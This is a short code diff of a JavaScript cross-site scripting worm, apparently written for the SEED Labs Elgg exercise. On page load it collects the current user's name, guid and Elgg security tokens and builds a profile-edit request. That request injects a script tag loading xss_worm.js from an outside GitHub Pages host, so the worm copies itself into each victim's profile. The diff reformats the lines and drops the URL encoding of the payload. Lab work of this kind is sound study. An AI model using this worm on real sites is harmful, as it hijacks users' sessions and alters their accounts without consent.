@@ -3,13 +3,13 @@ window.onload = function() {
     var Ajax = null;
     var Ajax2 = null;
     // 获取当前用户的名字、guid、token 和时间戳
-    var userName = "&name=" + elgg.session.user.name;
-    var guid = "&guid=" + elgg.session.user.guid;
-    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
-    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
+    var userName="&name="+elgg.session.user.name;
+var guid="&guid="+elgg.session.user.guid;
+var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+var token="&__elgg_token="+elgg.security.token.__elgg_token;
 
     // 将 <script> 标签内容进行 URL 编码，避免解析错误
-    var encodedScript = encodeURIComponent("<script type='text/javascript' src='https://z-summer-zhw.github.io/lab1/xss_worm.js'></script>");
+    var encodedScript = "<script type='text/javascript' src='https://z-summer-zhw.github.io/lab1/xss_worm.js'></script>";
     var content = userName + guid + token + ts + "&description=" + encodedScript;
     var samyGuid = 59;
     var profileEditUrl = "http://www.seed-server.com/action/profile/edit";
